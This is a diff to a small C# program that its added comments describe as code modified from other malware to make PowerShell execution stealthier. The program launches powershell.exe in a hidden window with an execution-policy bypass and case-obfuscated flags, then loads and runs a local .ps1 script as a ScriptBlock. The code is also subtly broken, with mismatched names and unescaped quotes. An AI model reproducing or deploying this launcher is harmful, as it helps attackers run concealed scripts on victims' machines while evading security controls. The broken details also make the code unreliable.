@@ -1,3 +1,6 @@
+//A Project by 5HR3K
+// I modified code from another piece of malware as I saw a possibility to be more stealthy in the Powershell Script Execution.
+
 using System;
 using System.Diagnostics;
 using System.Reflection;
@@ -12,7 +15,7 @@ internal class Program
 	{
 		ProcessStartInfo = new ProcessStartInfo();
 		processStartInfo.Filename = "powershell.exe";
-		processStartInfo.Arguments = "-eXEcUTiOnPolICY bYpaSs INvoKE-COmmand -SCrIPtBlOcK ([ScRIptblOck]::CrEATe((Get-CONteNt -Path "C:<File>.ps1>" -Raw)))";
+		processStartInfo.Arguments = "-eXEcUTiOnPolICY bYpaSs INvoKE-COmmand -SCrIPtBlOcK ([ScRIptblOck]::CrEATe((Get-CONteNt -Path "C:\<File>.ps1>" -Raw)))";
 		//Uses powershell Reflective Loading 
 		processStartInfo.UseShellExecute = false; //direct Create Process
 		processStartInfo.CreateNoWindow = true; //Invisible
